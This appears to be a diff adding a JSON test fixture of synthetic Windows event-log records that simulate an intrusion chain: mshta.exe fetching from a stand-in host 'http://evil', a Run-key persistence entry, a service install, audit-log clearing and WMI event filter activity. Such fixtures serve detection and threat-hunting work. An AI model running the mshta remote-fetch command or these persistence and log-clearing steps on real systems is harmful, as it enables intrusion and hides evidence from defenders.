@@ -1,0 +1,40 @@
+[
+  {
+    "EventID": 1,
+    "TimeCreated": "2026-03-12T09:00:00Z",
+    "Computer": "WORKSTATION5",
+    "User": "wardog",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "C:\\Windows\\System32\\mshta.exe http://evil",
+    "ProcessGuid": "{11111111-1111-1111-1111-111111111111}",
+    "ParentProcessGuid": "{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}"
+  },
+  {
+    "EventID": 13,
+    "TimeCreated": "2026-03-12T09:00:02Z",
+    "Computer": "WORKSTATION5",
+    "User": "wardog",
+    "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+  },
+  {
+    "EventID": 7045,
+    "TimeCreated": "2026-03-12T09:00:03Z",
+    "Computer": "WORKSTATION5",
+    "User": "wardog",
+    "Message": "A service was installed"
+  },
+  {
+    "EventID": 1102,
+    "TimeCreated": "2026-03-12T09:00:04Z",
+    "Computer": "WORKSTATION5",
+    "User": "wardog",
+    "Message": "The audit log was cleared"
+  },
+  {
+    "EventID": 19,
+    "TimeCreated": "2026-03-12T09:00:05Z",
+    "Computer": "WORKSTATION5",
+    "User": "wardog",
+    "Message": "WmiEventFilter activity"
+  }
+]
